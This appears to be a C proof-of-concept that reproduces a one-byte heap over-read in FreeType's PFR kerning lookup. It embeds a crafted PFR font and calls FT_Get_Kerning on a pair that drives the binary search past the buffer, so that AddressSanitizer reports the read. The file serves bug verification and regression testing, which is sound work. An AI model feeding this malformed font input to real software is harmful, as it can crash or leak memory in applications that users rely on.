/* Residual heap over-read PoC for pfr_face_get_kerning (CVE-class CWE-125).
 *
 * Builds a minimal valid PFR font entirely in memory, opens it through the
 * public FreeType API with a reading stream, and asks for the kerning value
 * of a glyph pair that is actually present in the font's kerning table.  On a
 * correctly fixed tree the binary search stays inside the kerning frame; on
 * the shipped tree the search base is mis-adjusted and the final probe reads
 * one byte past the heap frame, which AddressSanitizer reports.
 */

#include <ft2build.h>
#include FT_FREETYPE_H
#include <freetype/ftmodapi.h>
#include <freetype/internal/ftobjs.h>
#include <freetype/internal/ftdrv.h>
#include <string.h>
#include <stdio.h>

static const unsigned char pfr_font[] = {
  0x50,0x46,0x52,0x30,0x00,0x00,0x0d,0x0a,0x00,0x3a,0x00,0x07,
  0x00,0x3a,0x00,0x12,0x00,0x00,0x12,0x00,0x00,0x41,0x00,0x3b,
  0x00,0x00,0x3b,0x00,0x00,0x53,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x02,0x00,0x01,
  0x00,0x12,0x00,0x00,0x41,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x3b,0x00,0x00,0x53,0x00,
  0x00,0x03,0xe8,0x03,0xe8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x80,0x00,0x00,0x01,0x13,0x04,0x03,0x00,0x00,0x01,0x00,
  0x10,0x00,0x10,0x11,0x00,0x10,0x00,0x20,0x22,0x00,0x10,0x00,
  0x30,0x33,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x02,0x10,0x00,0x00,0x01,0x30,0x00,0x00,0x01,
};
static const unsigned long pfr_font_len = 142;

extern const FT_Driver_ClassRec  pfr_driver_class;

static unsigned long
mem_read( FT_Stream       stream,
          unsigned long   offset,
          unsigned char*  buffer,
          unsigned long   count )
{
  const unsigned char*  data = (const unsigned char*)stream->descriptor.pointer;

  if ( offset > stream->size )
    return 0;
  if ( count == 0 )
    return 0;
  if ( offset + count > stream->size )
    count = stream->size - offset;

  memcpy( buffer, data + offset, count );
  return count;
}

static void
mem_close( FT_Stream  stream )
{
  stream->base               = NULL;
  stream->size               = 0;
  stream->descriptor.pointer = NULL;
}

int
main( void )
{
  FT_Memory      memory;
  FT_Library     library;
  FT_Face        face;
  FT_StreamRec   stream;
  FT_Open_Args   args;
  FT_Vector      kerning;
  FT_Error       error;

  memory = FT_New_Memory();
  if ( !memory )
    return 2;

  if ( FT_New_Library( memory, &library ) )
    return 2;
  FT_Add_Module( library, (FT_Module_Class*)&pfr_driver_class );

  memset( &stream, 0, sizeof ( stream ) );
  stream.base               = NULL;
  stream.size               = pfr_font_len;
  stream.pos                = 0;
  stream.descriptor.pointer = (void*)pfr_font;
  stream.read               = mem_read;
  stream.close              = mem_close;

  memset( &args, 0, sizeof ( args ) );
  args.flags  = FT_OPEN_STREAM;
  args.stream = &stream;

  error = FT_Open_Face( library, &args, 0, &face );
  if ( error )
  {
    fprintf( stderr, "FT_Open_Face failed: 0x%x\n", error );
    return 2;
  }

  /* glyphs 1 and 2 both carry char code 0x20, so the looked-up pair is */
  /* 0x00200020 -- the last entry of the kerning table.                 */
  error = FT_Get_Kerning( face, 1, 2, FT_KERNING_UNSCALED, &kerning );
  if ( error )
  {
    fprintf( stderr, "FT_Get_Kerning failed: 0x%x\n", error );
    FT_Done_Face( face );
    FT_Done_Library( library );
    return 2;
  }

  printf( "kerning.x = %ld\n", (long)kerning.x );

  FT_Done_Face( face );
  FT_Done_Library( library );
  return 0;
}
